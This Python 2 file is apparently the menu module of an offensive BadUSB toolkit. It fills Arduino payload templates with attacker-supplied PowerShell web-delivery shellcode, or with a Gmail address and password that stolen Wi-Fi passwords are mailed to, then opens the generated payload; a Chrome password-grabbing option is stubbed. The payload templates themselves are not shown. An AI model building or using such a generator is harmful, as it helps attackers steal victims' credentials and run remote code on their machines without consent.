from mainmenu import *
def subpowershellmenu():
    from mainmenu import mainmenu
    print ("""
    1 - Webdelivery Powershell Attack
    2 - Grabb Wifi's passwords from user
    3 - Grabb GoogleCrhome passwords from user
    0 - Back to frist select menu
    """)

    submenuselect = raw_input(str("Say the option for show: "))

    if submenuselect == "1":
        print ("Webdelivery ok")
        os.system('cls')
        logo1()
        webdlvrypayload = raw_input(str("Put the shell code: "))
        print (webdlvrypayload)

        f = open('payloads/WebdeliveryPsh.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("WDLVRYPAYLOAD", webdlvrypayload)
        f = open('out/OUT-WebdeliveryPsh.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-WebdeliveryPsh.ino")



    elif submenuselect == "2":

        usermail = raw_input(str("Digite seu Gmail : "))
        print (usermail)
        passwd = raw_input(str("Digite a senha do Gmail : "))
        print (passwd)

        f = open('payloads/WifiGrabbpasswordtoMail.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("EMAIL@gmail.com", usermail).replace("PASSWORD", passwd)
        f = open('out/OUT-WifiGrabbpasswordtoMail.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-WifiGrabbpasswordtoMail.ino")

    elif submenuselect == "3":
        print ("Edit ok")



    elif submenuselect == "0":
        os.system('cls')
        logo1()
        mainmenu()
    else:
        os.system('cls')
        logo1()
        print ("Select one valid option!!")
        subpowershellmenu();

